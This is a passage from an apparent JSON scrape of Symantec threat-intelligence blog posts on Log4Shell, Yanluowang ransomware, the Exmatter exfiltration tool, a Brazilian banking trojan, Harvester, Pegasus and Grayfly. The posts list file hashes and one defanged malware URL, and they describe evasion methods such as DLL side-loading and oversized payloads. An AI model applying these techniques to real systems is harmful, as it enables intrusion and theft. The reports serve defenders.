916cc8d6bf2282ae0d2db587f4f96780af59e685a1f1a511e0b2b276669dc802 – ProcDump e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496 – ProcDump f6600e5d5c91ed30d8203ef2bd173ed0bc431453a31c03bc363b89f77e50d4c5 - SOCKS5 proxy server 6d73c0bcdf1274aeb13e5ba85ab83ec00345d3b7f3bb861d1585be1f6ccda0c5 – Keylogger 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 – Mimikatz 96632f716df30af567da00d3624e245d162d0a05ac4b4e7cbadf63f04ca8d3da – Mimikatz bee3d0ac0967389571ea8e3a8c0502306b3dbf009e8155f00a2829417ac079fc – Mimikatz d9770865ea739a8f1702a2651538f4f4de2d92888d188d8ace2c79936f9c2688 - Mimikatz The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/espionage-campaign-telecoms-asia-middle-east"
  },
  {
    "title": "apache log4j zero day",
    "content": "UPDATE December 20, 2021:The Apache Software Foundation has released a patch for a third vulnerability in Log4j. Version 2.17.0 of the software was released on December 17 after issues were discovered with the previous release (2.16). Apache said that 2.16 does not always protect from infinite recursion in lookup evaluation and is vulnerable to CVE-2021-45105, a denial of service vulnerability. UPDATE December 15, 2021:Apache has patched a second vulnerability in Log4j. The vulnerability (CVE-2021-45046) arises from the fact that the fix for the previous vulnerability (CVE-2021-44228) did not completely prevent exploits in all circumstances. According to Apache, the vulnerability occurs in certain non-default configurations. It could permit attackers to “craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack”. A zero-day vulnerability (CVE-2021-44228) has been discovered in Apache Log4j which, if exploited, could permit a remote attacker to execute arbitrary code on vulnerable systems. Exploit code for this vulnerability, dubbed Log4Shell, has been shared publicly and multiple attackers are already attempting to exploit it. Q: Will Symantec protect against exploit attempts? A:Yes, Symantec products will guard against exploit attempts and payloads with the following detections: Machine learning-based Symantec Data Center Securityprovides a range of protection for server workloads against this vulnerability: Q: What is the significance of this vulnerability? A:Apache Log4j is a java-based logging utility. It is widely used in cloud and enterprise software services. The fact that an exploit was discovered prior to the creation of a patch only heightens the severity of the threat. Q: Has the vulnerability been patched? A:Yes, users areadvised to update to version 2.15.0 immediately. Apache has also provided mitigation advice for users of earlier versions. Q: Is this vulnerability being exploited in the wild? A:Yes. Exploit code is publicly available and there are multiple reports of exploit attempts. To date, activity appears to be mainly centered on coin mining botnets but it is only a matter of time before attackers of all types attempt to leverage this exploit. For the latest protection updates, please visit theSymantec Protection Bulletin. 1.Broadcom Response to Log4j Vulnerability 2.Symantec Security Advisory The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/apache-log4j-zero-day"
  },
  {
    "title": "yanluowang ransomware attacks continue",
    "content": "Yanluowang, the ransomware recentlydiscovered by Symantec, a division ofBroadcom Software, is now being used by a threat actor that has been mounting targeted attacks against U.S. corporations since at least August 2021. The attacker uses a number of tools, tactics, and procedures (TTPs) that were previously linked to Thieflock ransomware attacks, suggesting that they may have been a Thieflock affiliate who shifted allegiances to the new Yanluowang ransomware family. The attackers have been heavily focused on organizations in the financial sector but have also targeted companies in the manufacturing, IT services, consultancy, and engineering sectors. In most cases, PowerShell is used to download tools to compromised systems including BazarLoader to assist in reconnaissance. The attackers then enable RDP via registry to enable remote access. After gaining initial access, the attackers usually deploy ConnectWise (formerly known as ScreenConnect), a legitimate remote access tool. In order to perform lateral movement and identify systems of interest, such as the victim’s Active Directory server, the attackers deploy Adfind, a free tool that can be used to query Active Directory, and SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for discovery of hostnames and network services. The next phase of the attack is credential theft and the attackers use a wide range of credential-stealing tools, including: Along with these tools, the attackers also use a number of open-source tools such as KeeThief, a PowerShell script to copy the master key from KeePass. In some cases, customized versions of open-source credential-dumping tools were also observed (secretsdump.exe). Credentials were also dumped from the registry. In addition, the attackers have also used a number of other data capture tools, including a screen capture tool and a file exfiltration tool (filegrab.exe). Cobalt Strike Beacon was also deployed against at least one targeted organization. Other tools used include ProxifierPE, which can be used to proxy connections back to attacker-controlled infrastructure, and the free, Chromium-based Cent web browser. There is a tentative link between these Yanluowang attacks and older attacks involving Thieflock, ransomware-as-a-service developed by the Canthroid (aka Fivehands) group. Several TTPs used by these attackers overlap with TTPs used in Thieflock attacks, including: This link begs the question of whether Yanluowang was developed by Canthroid. However, analysis of Yanluowang and Thieflock does not provide any evidence of shared authorship. Instead, the most likely hypothesis is that these Yanluowang attacks may be carried out by a former Thieflock affiliate. For the latest protection updates, please visit theSymantec Protection Bulletin. a710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789 – NetScan 2c2513e17a23676495f793584d7165900130ed4e8cccf72d9d20078e27770e04 – Adfind 43f8a66d3f3f1ba574bc932a7bc8e5886fbeeab0b279d1dea654d7119e80a494 – BazarLoader 9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732 – Veeamp 85fb8a930fa7f4c32c8af86aa204eb4ea4ae404e670a8be17e7ae0adf37a9e2e – GrabFF e4942fde1cd7f2fcfb522090fd16298bce247295fe99182aecf7b10be3f5dc53 – ConnectwiseInstaller fe38912d64f6d196ac70673cd2edbdbc1a63e494a2d7903546a6d3afa39dc5c4 – WmiExecAgent c77ff8e3804414618abeae394d3003c4bb65a43d69c57c295f443aeb14eaa447 – NetScan 2fc5bf9edcfa19d48e235315e8f571638c99a1220be867e24f3965328fe94a03 – Secretsdump 4ff503258e23d609e0484ee5df70a1db080875272ab6b4db31463d93ebc3c6dd – GrabFile 1c543ea5c50ef8b0b42f835970fa5f553c2ae5c308d2692b51fb476173653cb3 – GrabChrome 0b9219328ebf065db9b26c9a189d72c7d0d9c39eb35e9fd2a5fefa54a7f853e4 – OpenChromeDumps b556d90b30f217d5ef20ebe3f15cce6382c4199e900b5ad2262a751909da1b34 – BrowserPassView 5e03cea2e3b875fdbf1c142b269470a9e728bcfba1f13f4644dcc06d10de8fb4 – ConHost 49d828087ca77abc8d3ac2e4719719ca48578b265bbb632a1a7a36560ec47f2d – Yanluowang The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/yanluowang-ransomware-attacks-continue"
  },
  {
    "title": "blackmatter data exfiltration",
    "content": "At least one affiliate of the BlackMatter ransomware operation has begun using a custom data exfiltration tool in its attacks. Exmatter, which was discovered by Symantec’s Threat Hunter Team, is designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim’s network. This is the third time a custom data exfiltration tool appears to have been developed by ransomware operators, following the earlier discovery of the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware operation. Exmatter is compiled as a .NET executable and obfuscated. When run, it checks its command line arguments for the following strings: \"nownd\" and \"-nownd\". If either is found, it attempts to hide its own window by calling the \"ShowWindow\" API as follows: In order to identify files for exfiltration, it will retrieve the drive names of all logical drives on the infected computer and collect all file path names, disregarding anything under the following directories: It will also exclude files of less than 1,024 bytes in size and files with the following attributes: It will only exfiltrate files with the following extensions: It attempts to prioritize files for exfiltration by using LastWriteTime. Files that match the criteria are then uploaded to a remote SFTP server using the following parameters: Exmatter also includes SOCKS5 configuration, but this is not used: When it has finished exfiltrating data, Exmatter starts the following process to remove any trace of itself: This will attempt to overwrite an initial chunk of the file before deleting it. Multiple variants of Exmatter have been found, suggesting that the attackers have continued to refine the tool in order to expedite exfiltration of a sufficient volume of high value data in as short a time as possible. In a second variant, the directory “C:\\Program Files\\Windows Defender Advanced Threat Protection\\Classification\\Configuration” has been replaced with “C:\\Program Files\\Windows Defender Advanced Threat Protection\" on the exclusion list. The file types “.xlsm”, and “.zip” were added to the inclusion list. A third version of note added a WebDav client. The code structure suggests that SFTP remains the first choice protocol, with WebDav acting as a backup. The WebDav client uses the following URL: The following file types were also added to the inclusion list: In addition to this, Exmatter is configured to skip exfiltration for files with names containing any of the following strings: A fourth variant contained updated SFTP server details: The WebDav client used the following updated URL: Finally, the list of files for inclusion was updated by removing “.png”. BlackMatter is linked to the Coreid cyber crime group, which was previously responsible for the Darkside ransomware. For the past 12 months, it has been one of the most prolific targeted ransomware operators and its tools have been used in a number of ambitious attacks, most notably the May 2021 Darkside attack on Colonial Pipeline that disrupted fuel supplies to the East Coast of the U.S. Coreid operates under a RaaS model, working with affiliates to conduct ransomware attacks and then taking a share of the profits. Like most ransomware actors, attacks linked to Coreid steal victims’ data and the group then threatens to publish it to further pressure victims into paying the ransom demand. Whether Exmatter is the creation of Coreid itself or one of its affiliates remains to be seen, but its development suggests that data theft and extortion continues to be a core focus of the group. For the latest protection updates, please visit theSymantec Protection Bulletin. 325ecd90ce19dd8d184ffe7dfb01b0dd02a77e9eabcb587f3738bcfbd3f832a1 5e355f90b398cbb54829038c6e5d68e8c578405d142bdcc2386cf6161c8d7014 8eded48c166f50be5ac33be4b010b09f911ffc155a3ab76821e4febd369d17ef b6bc126526e27c98a94aab16989864161db1b3a75f18bd5c72bacbdfccad7bd7 fcaed9faa026a26d00731068e956be39235487f63e0555b71019d16a59ea7e6b The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/blackmatter-data-exfiltration"
  },
  {
    "title": "banking trojan latam brazil",
    "content": "Up to 100 organizations in Brazil have been targeted with a banking Trojan since approximately late August 2021, with the most recent activity seen in early October. This campaign appears to be a continuation of activity thatwas published about by researchers at ESET in 2020. The attackers appeared to be undeterred by exposure and Symantec, a division of Broadcom Software, has found a large number of new indicators of compromise (IOCs) relating to this latest wave of attacks. Symantec’s Threat Hunter Team first became aware of this recent campaign when suspicious activity was spotted in a customer environment on September 30, 2021. This initial suspicious activity was detected by our Cloud Analytics technology, and further investigation found that attempts were being made to download a suspicious file named mpr.dll onto the customer’s environment. Msiexec.exe was attempting to download the file from a suspicious URL. Further analysis indicated that five files were downloaded, four of which were signed and appeared to be legitimate DLL files, but the file named mpr.dll was not signed and was suspiciously large for a single DLL file at 588 MB. Symantec researchers concluded that this was a “Latin American banking Trojan”, due to the similar characteristics and file names seen in this campaign and in the research into Latin American banking Trojans published by ESET in 2020. Further investigation by our analysts revealed similar activity had been aimed at multiple different organizations since late August 2021. In fact, as many as 98 organizations may have been targeted with similar activity, with all affected organizations based in Brazil. The sectors targeted with this activity included information technology, professional services, manufacturing, financial services, and government. Banking Trojans are a type of malware designed to steal victims’ online banking information so malicious actors can access victims’ bank accounts. Once on a machine, the malware typically works by monitoring the websites victims are visiting and comparing these to a hardcoded list. If the victim visits a banking website the Trojan will generally display a spoofed login page in a pop-up over the legitimate page in an attempt to harvest victims’ banking credentials. These pop-ups are generally made to imitate the specific banks’ legitimate login pages and are often quite convincing. While once one of the biggest threats on the cyber-crime landscape, banking Trojans have been usurped in many parts of the world by ransomware in recent times. However, in Latin America particularly they still dominate a lot of cyber-crime activity. In its 2020 report, ESET determined that there were 11 banking Trojan gangs operating in Latin America, and that these groups cooperated with each other. It came to this conclusion due to the many shared tactics, tools, and procedures used by the cyber criminals deploying banking Trojans in Latin America. We did not observe what the initial infection vector was in this campaign, but it was likely a malicious URL spread via either spam email campaigns or through malvertising, which is typically the first step in Latin American banking Trojan campaigns. Victims are then directed to one of the following malicious URLs: Victims are then redirected to an Amazon Web Services (AWS) URL, which it appears the attackers abused to use as a command-and-control (C&C) server. A ZIP file that contains a Microsoft Software Installer (MSI) file is downloaded from the AWS infrastructure. ESET reported that most gangs deploying banking Trojans in Latin America had started using MSI files as an initial download in 2019. An MSI file can be used to install, uninstall, and update applications running on Windows systems. If the victim double-clicks the MSI file inside the downloaded ZIP, it will execute msiexec.exe, which then connects to a secondary C&C server to download another ZIP file containing the payload (mpr.dll), along with other legitimate portable executable (PE) files. The URLs observed being accessed by msiexec.exe included: The extracted ZIP file contains a renamed legitimate Oracle application - VBoxTray.exe. This is executed to load the payload (mpr.dll) by way of DLL search-order hijacking. DLL search-order hijacking takes advantage of how Windows handles DLLs to allow an attacker to load malicious code into a legitimate process. The mpr.dll file is also bigger than 100 MB in order to evade submission to security services, which tend not to process files above that size. Both of these files and this exact same process were observed in the banking Trojan activity detailed in ESET’s report. Persistence is then created for the renamed VBoxTray.exe so that mpr.dll is always side-loaded into it by way of either Windows Registry or Windows Management Instrumentation (WMI). This is another common technique used in the attack chain for Latin American banking Trojans. The various steps taken by the attackers behind this activity to evade detection - such as using a large file for the payload so that it won’t be scanned by security software, and leveraging legitimate processes and applications for malicious purposes - show that those behind this attack campaign are reasonably sophisticated actors. The number of organizations affected in this campaign also indicates that a large number of people are likely responsible for this activity - and it may be that more than one group is behind this activity. It could be a number of groups acting in a cooperative manner, as ESET said may be the approach taken by the various banking Trojan attack groups operating in Latin America. While ransomware dominates much of the discussion on the cyber-crime landscape at the moment, it is important to remember it is not the only threat out there. Banking Trojans have the potential to be a costly problem for individuals and organizations, so people, especially those based in Latin America where this activity appears to be particularly prevalent, need to remain alert to this threat. Simple steps, like ensuring you have multi-factor authentication enabled on all financial accounts, can help lessen the impact of threats like these. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/banking-trojan-latam-brazil"
  },
  {
    "title": "espionage campaign south east asia",
    "content": "An espionage campaign using a previously undocumented toolset has targeted a range of organizations in South East Asia. Among the identified targets are organizations in the defense, healthcare, and information and communications technology (ICT) sectors. The campaign appears to have begun in September 2020 and ran at least until May 2021. The toolset used by the attackers includes loaders, a modular backdoor, a keylogger, and an exfiltration tool designed to abuse cloud storage service Dropbox. The initial infection vector employed by the attackers remains unknown. The earliest sign of attempted compromise is a loader that decrypts and loads a payload from a .dat file. At least two different file names have been observed for the .dat file: sdc-integrity.dat and scs-integrity.dat. The loader also calls the DumpAnalyze export from the decrypted payload. The payload has yet to be identified but is almost certainly a modular backdoor. This can be inferred from one of the modules identified. This \"Orchestrator\" module points to the existence of a separate DLL module that exposes at least 16 functions, as well as the existence of a custom binary command and control (C&C) protocol used by Orchestrator but implemented separately. This module appears to be a core component of the backdoor. It runs as a Windows service and a large part of its functionality is implemented in a separate DLL that is loaded from registry (located in HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\<value_name_resolved_at_runtime>). The module is expected to export the following functions: The module loads a configuration either from a file (CSIDL_COMMON_APPDATA\\Microsoft\\Crypto\\RSA\\Keys.dat) or from the registry (HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\CONFIG). The configuration is encrypted. The module uses the function Decrypt_ByteToByte from the separate DLL to decrypt the configuration. The configuration is expected to contain the following options (stored in XML format): The module also uses the hardcoded mutex name, Global\\QVomit4. Other tools used in the campaign include a keylogger, which shows signs of being authored by the same developer, sharing unique strings with other tools and string obfuscation techniques. The attackers also used 7zr, a legitimate tool that is a lightweight version of the 7-Zip archiver, in addition to a data-exfiltration tool that sends stolen data to Dropbox. The nature of the targets and the tools used have all the hallmarks of an espionage operation. Symantec has yet to attribute the attacks to a known actor and it appears that the attackers took some steps to complicate attribution. For example, it is not clear what language the group speaks and samples of the backdoor module found contained strings in what appeared to be both Cyrillic and Urdu scripts. The only potential clue found to date is that one of the organizations attacked was also targeted by a tool used by the China-linked Leafhopper group (aka APT30) during the same time period. However, there is no evidence as yet to tie the tool to this campaign. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/espionage-campaign-south-east-asia"
  },
  {
    "title": "harvester new apt attacks asia",
    "content": "A previously unseen actor, likely nation-state-backed, is targeting organizations in South Asia, with a focus on Afghanistan, in what appears to be an information-stealing campaign using a new toolset. The Harvester group uses both custom malware and publicly available tools in its attacks, which began in June 2021, with the most recent activity seen in October 2021. Sectors targeted include telecommunications, government, and information technology (IT). The capabilities of the tools, their custom development, and the victims targeted, all suggest that Harvester is a nation-state-backed actor. The most notable thing about this campaign is the previously unseen toolset deployed by the attackers. The attackers deployed a custom backdoor called Backdoor.Graphon on victim machines alongside other downloaders and screenshot tools that provided the attackers with remote access and allowed them to spy on user activities and exfiltrate information. We do not know the initial infection vector that Harvester used to compromise victim networks, but the first evidence we found of Harvester activity on victim machines was a malicious URL. The group then started to deploy various tools, including its custom Graphon backdoor, to gain remote access to the network. The group also tried to blend its activity in with legitimate network traffic by leveraging legitimate CloudFront and Microsoft infrastructure for its command and control (C&C) activity. The custom downloader used by the attackers leverages the Costura Assembly Loader. Once on a victim machine, it checks if the following file exists: If the file does not exist it downloads a copy from the following URL: Next, the sample creates the following file if it does not exist: Then it sets the following registry value to create a loadpoint: Finally it opens an embedded web browser within its own UI using the following URL: While it initially appeared that this URL may have been a loadpoint for Backdoor.Graphon, upon further investigation it appears to be a decoy to confuse any affected users. Backdoor.Graphon is compiled as a .NET PE DLL with export “Main” and the following PDB file name: When this is executed, it attempts to communicate with the attackers’ C&C servers, which are hosted on Microsoft infrastructure. The attackers then run commands to control their input stream and capture the output and error streams. They also periodically send GET requests to the C&C server, with the content of any returned messages extracted and then deleted. Data that cmd.exe pulled from the output and error streams is encrypted and sent back to the attackers’ servers. The custom screenshot tool was also packed with the Costura Assembly Loader. The screenshot tool takes photos that it saves to a password-protected ZIP archive for exfiltration, with all archives older than a week deleted. While we do not have enough evidence yet to attribute Harvester’s activity to a specific nation state, the group’s use of custom backdoors, the extensive steps taken to hide its malicious activity, and its targeting all point to it being a state-sponsored actor. Harvester’s use of legitimate infrastructure to host its C&C servers in order to blend in with normal network traffic is one example of the stealthy steps taken by this actor. The targeting of organizations in Afghanistan in this campaign is also interesting given the huge upheaval seen in that country recently. The activity carried out by Harvester makes it clear the purpose of this campaign is espionage, which is the typical motivation behind nation-state-backed activity. That Harvester’s most recent activity was seen earlier this month means that organizations in the sectors and geographies mentioned should be alert to the malicious activity outlined in this blog. For the latest protection updates, please visit theSymantec Protection Bulletin. 0740cc87a7d028ad45a3d54540b91c4d90b6fc54d83bb01842cf23348b25bc42 303f93cc47c58e64665f9e447ac11efe5b83f0cfe4253f3ff62dd7504ee935e0 3c34c23aef8934651937c31be7420d2fc8a22ca260f5afdda0f08f4d3730ae59 3c8fa5cc50eb678d9353c9f94430eeaa74b36270c13ba094dc5c124259f0dc31 470cd1645d1da5566eef36c6e0b2a8ed510383657c4030180eb0083358813cd3 691e170c5e42dd7d488b9d47396b633a981640f8ab890032246bf37704d4d865 a4935e31150a9d6cd00c5a69b40496fea0e6b49bf76f123ea34c3b7ea6f86ce6 c4b6d7e88a63945f3e0768657e299d2d3a4087266b4fc6b1498e2435e311f5d1 cb5e40c6702e8fe9aa64405afe462b76e6fe9479196bb58118ee42aba0641c04 d84a9f7b1d70d83bd3519c4f2c108af93b307e8f7457e72e61f3fa7eb03a5f0d f4a77e9970d53fe7467bdd963e8d1ce44a2d74e3e4262cd55bb67e7b3001c989 hxxps://perfect-couple.com/perfectcouple[.]exe – sample was downloaded from this address BLOG UPDATED2.45pm, October 18, 2021: Minor updates made for clarity The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/harvester-new-apt-attacks-asia"
  },
  {
    "title": "yanluowang targeted ransomware",
    "content": "The Symantec Threat Hunter Team, a part ofBroadcom Software, has uncovered what appears to be a new ransomware threat called Yanluowang that is being used in targeted attacks. In a recent attempted ransomware attack against a large organization, Symantec obtained a number of malicious files that, upon further investigation, revealed the threat to be a new, if somewhat underdeveloped, ransomware family. The Threat Hunter Team first spotted suspicious use of AdFind, a legitimate command-line Active Directory query tool, on the victim organization’s network. This tool is often abused by ransomware attackers as a reconnaissance tool, as well as to equip the attackers with the resources that they need for lateral movement via Active Directory. Just days after the suspicious AdFind activity was observed on the victim organization, the attackers attempted to deploy the Yanluowang ransomware. Before the ransomware is deployed on a compromised computer, a precursor tool carries out the following actions: The Yanluowang ransomware is then deployed and carries out the following actions: The ransom note dropped by Yanluowang warns victims not to contact law enforcement or ransomware negotiation firms. If the attackers’ rules are broken the ransomware operators say they will conduct distributed denial of service (DDoS) attacks against the victim, as well as make “calls to employees and business partners.” The criminals also threaten to repeat the attack “in a few weeks” and delete the victim’s data. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/yanluowang-targeted-ransomware"
  },
  {
    "title": "ransomware targeted 2021",
    "content": "For the last number of years, targeted ransomware has been one of the main cyber risks for businesses and other large organizations. However, as outlined in anew whitepaperfrom the Symantec Threat Hunter Team, a part ofBroadcom Software, the past twelve months have seen ransomware attackers become more aggressive, finding more ways to increase the reach of their attacks, and becoming more ambitious by mounting a number of audacious and highly disruptive attacks. The attack against Colonial Pipeline in the U.S. in May 2021 caused significant disruption and prompted concerns about the nation’s fuel supplies. In the same month, an attack on Ireland’s national health service, the Health Service Executive, forced it to cancel thousands of appointments and initiate a recovery operation that is only now concluding. While the overall levels of ransomware activity have fallen, this is accounted for by the decline of mass-mailing, indiscriminate ransomware attacks. Of greater concern is that the number of organizations confirmed as affected by targeted ransomware attacks increased by up by 83% over the past 18 months, from 81 in January 2020 to 148 in June 2021. The real number of targeted ransomware attacks is much higher. Confirmed attacks from known targeted ransomware families are probably only a representative sample of the overall number of attacks involving these threats. Many targeted ransomware attacks are halted before payload deployment, meaning they may not be identified as ransomware. In addition, most targeted ransomware operators recompile their ransomware for every new attack. This means that the variant of the ransomware used in an attack may be blocked by generic or machine learning-generated detections rather than a detection linked to that ransomware family. Alongside this increase in activity levels, the ransomware threat landscape has become more complex and sophisticated and a number of new developments have compounded the threat for organizations. Although ransomware-as-a-service (RaaS) is not a new concept, the RaaS marketplace has evolved significantly over the past year. The basic template currently involves ransomware authors offering access to the ransomware itself, hosting for breached data, and handling of ransom negotiations. In some cases, it has been reported that ransomware developers provide an entire playbook for affiliates. However, some ransomware affiliates now appear to be becoming less reliant on ransomware authors. While affiliates have long been known to migrate to other ransomware developers if the developer they were working with shuts down, many are now using their own distinct tools, tactics, and procedures (TTPs) regardless of the payload they are deploying. Some affiliates now appear to be simultaneously collaborating with more than one ransomware author. Symantec Threat Hunter Team has observed affiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack. Over the past 12 months, secondary infections, usually via botnets, have become one of the most prevalent means of access for ransomware groups. Trojans that were once used for financial fraud, such as Trickbot, have recently been repurposed mainly as distribution channels for other malware, most notably ransomware. In some cases, ransomware attackers already control the botnets, such as the Miner group (aka Wizard Spider), which owns the Trickbot botnet. Trickbot has been seen as a precursor to attacks by Ryuk, which is also attributed to Miner. Similarly, Hispid (aka Evil Corp) have leveraged their own Dridex botnet, which was originally built to mount financial attacks, to give them a means of delivering the ransomware to organizations. Other actors have since attempted to replicate this attack pattern, seeking collaborations with established botnet operators. The most notable of these is the use of IcedID by at least one affiliate operator of the Conti ransomware. The profusion of groups carrying out targeted ransomware attacks combined with the evolution of the RaaS marketplace now means that targeted ransomware poses a grave threat to organizations. Although ransomware gangs have attracted significant government and law enforcement attention in recent months, multi-million dollar ransom payments mean that most threat actors remain undeterred. For more information, read our whitepaper: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-targeted-2021"
  },
  {
    "title": "pegasus forcedentry protection",
    "content": "The recent iOS 14.8 update fixes a zero-day, zero-click exploit for a vulnerability affecting every mobile iOS device. The flaw, dubbed FORCEDENTRY (CVE-2021-30860), resided in Apple’s iMessage and, according toa report by The Citizen Lab, was used to push NSO Group’s Pegasus spyware to mobile iOS devices dating back to as far as February 2021. Pegasus has been around for some years now but has been back in the spotlight recently following reports from both The Citizen Lab andAmnesty Internationalabout the spyware targeting journalists, activists, and others. One of the main concerns with FORCEDENTRY is that it can be used in what is called a zero-click attack, meaning it requires no user interaction. An attacker exploiting the flaw only needs the Apple ID of a device in order to silently compromise it This post will cover what is currently known about the Pegasus threat, how common it is, and how Symantec, a part ofBroadcom Software, is keeping its customers safe from the spyware. Developed by Israeli cyber arms firm NSO Group, Pegasus is a sophisticated and elusive mobile spyware that has been around for some years now. Pegasus has the ability to read messages, track calls, track device location, collect passwords, and access the target device's microphone and camera. According to NSO Group, Pegasus is sold to nation-states and law enforcement to help in the fight against crime and terrorism, and to maintain public safety. Despite this statement, misuse of the software has been flagged over the years and Symantec has had a long-standing capability to detect it. A recent reportuncovered attacks exploiting vulnerabilities in Apple's iMessage service in order to install Pegasus. The attack only needs the Apple ID - an email or phone number - to infect the targeted mobile device. The attack payload uses iMessage fields that are \"hidden\" from the user; in fact, if the iMessage text field is blank, no alerts or notifications are shown at all. This type of iMessage zero-click attack dates back to iOS 11 and research done by the Google Project Zero team. The payload exploits vulnerabilities in the iMessage framework, such as exploiting the PDF processor by sending a maliciously crafted PDF to achieve arbitrary code execution (fixed in the iOS 14.8 update). Further, the attack execution takes place entirely inside the iMessage framework’s sandbox processes and is wiped when the device restarts. Suffice to say, this makes measuring the scope of the Pegasus threat challenging. The best clue left behind by a FORCEDENTRY attack is the resulting web traffic it generates when it tries to download Pegasus spyware framework files. Reports from Amnesty International listed known Pegasus infection URLs. We ran that list against theSymantec WebPulseURL reputation service used by Symantec Endpoint Protection Mobile to identify and block suspect web traffic. We found close to 1 in 150,000 iOS devices attempting to access a known Pegasus infection URL. While this number might seem low, this is only one part of the kill chain and the list of known infection URLs is by no means exhaustive. In any case, Symantec WebPulse was able to identify the URLs as potential risks or malicious, and stop the infection and kill chain - even if it contained zero-day exploits and required zero user clicks - dead in its tracks. Symantec Endpoint Protection Mobile analyzes links contained within SMS messages, shielding users from attacks by checking URLs (even those that might be hidden to the user) against the threat intelligence in Symantec WebPulse, part of the Symantec Global Intelligence Network. Symantec Endpoint Protection Mobile provides protection against network content threats, filtering and blocking communication to known command-and-control servers used in Pegasus campaigns (the same WebPulse global URL intelligence information isembedded in both our Windows and Mac Symantec Endpoint Protection agents). It can also identify and protect vulnerable iOS & Android devices. For more details around coverage see the Pegasus SpywareProtection Bulletinfrom the Symantec Security Center. Patches for FORCEDENTRY are available formacOS,iOS, iPadOS, andwatchOS, and users are advised to apply these patches as soon as possible. Apple addressed the FORCEDENTRY vulnerability quickly with its iOS 14.8 update. However, with the iMessage framework increasingly a target for threat hunters, we expect many more fixes to come. We also expect the number of attacks targeting iOS devices will follow similar attack patterns used by Pegasus. Unfortunately, with limited visibility into the attack payload and kill chain, attackers know they can easily evade detection. All this highlights how important it is to have mobile endpoint protection as part of a layered network defense strategy to prevent known and unknown (zero-day) attacks targeting mobile devices. Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/pegasus-forcedentry-protection"
  },
  {
    "title": "grayfly china sidewalk malware",
    "content": "Symantec, part ofBroadcom Software, has linked the recently discovered Sidewalk backdoor to the China-linked Grayfly espionage group. The malware, which is related to the older Crosswalk backdoor (Backdoor.Motnug) has been deployed in recent Grayfly campaigns against a number of organizations in Taiwan, Vietnam, the United States, and Mexico. A feature of this recent campaign was that a large number of targets were in the telecoms sector. The group also attacked organizations in the IT, media, and finance sectors. Sidewalk was recently documented by ESET, who attributed it to a new group it called SparklingGoblin, which it linked to the Winnti malware family. Symantec’s Threat Hunter Team has attributed Sidewalk to Grayfly, a longstanding Chinese espionage operation. Members of the groupwere indicted in the U.S. in 2020. The recent campaign involving Sidewalk suggests that Grayfly has been undeterred by the publicity surrounding the indictments. Grayfly (aka GREF and Wicked Panda) is a targeted attack group that has been active since at least March 2017 using a custom backdoor known as Backdoor.Motnug (aka TOMMYGUN/CROSSWALK), a custom loader called Trojan.Chattak, Cobalt Strike (aka Trojan.Agentemis), and ancillary tools in its attacks. Grayfly has been observed targeting a number of countries in Asia, Europe, and North America across a variety of industries, including food, financial, healthcare, hospitality, manufacturing, and telecommunications. In more recent activity, Grayfly has continued with its focus on telecommunications but has also been observed targeting organizations operating within the media, finance, and IT service provider sectors. Typically Grayfly targets publicly facing web servers to install web shells for initial intrusion, before spreading further within the network. Once a network has been compromised, Grayfly may install its custom backdoors onto additional systems. These tools allow the attackers to have comprehensive remote access to the network and proxy connections allowing them to access hard-to-reach segments of a target's network. Although sometimes labeled APT41, we consider Grayfly the espionage arm of APT41. Similarly, Symantec tracks other sub-groups of APT41 separately, such as Blackfly, its cyber-crime arm. A characteristic 